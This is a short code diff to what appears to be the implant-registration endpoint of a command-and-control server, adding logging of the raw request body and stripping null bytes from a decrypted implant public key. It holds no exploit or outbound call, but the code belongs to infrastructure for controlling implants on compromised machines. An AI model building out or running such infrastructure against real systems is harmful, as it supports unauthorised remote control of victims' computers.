@@ -80,6 +80,8 @@ def register():
     if request.json is None or request.json.get("txid") is None:
         return "Unauthorized", 401
 
+    logger.error(request.json)
+
     # Get the (encrypted) implant public key
     implant_public_key_b64_encrypted = request.json["txid"]
 
@@ -88,6 +90,8 @@ def register():
         key = base64.b64decode(C2_PROFILE.globals.registration_password)
         box = nacl.secret.SecretBox(key)
         implant_public_key_b64 = box.decrypt(implant_public_key_b64_encrypted, encoder=Base64Encoder).decode("utf-8")
+        # Remove all null bytes
+        implant_public_key_b64 = implant_public_key_b64.replace("\0", "")
     except Exception as e:
         logger.error(f"{e}")
         logger.error(f"Failed to decrypt implant public key: {implant_public_key_b64_encrypted}")
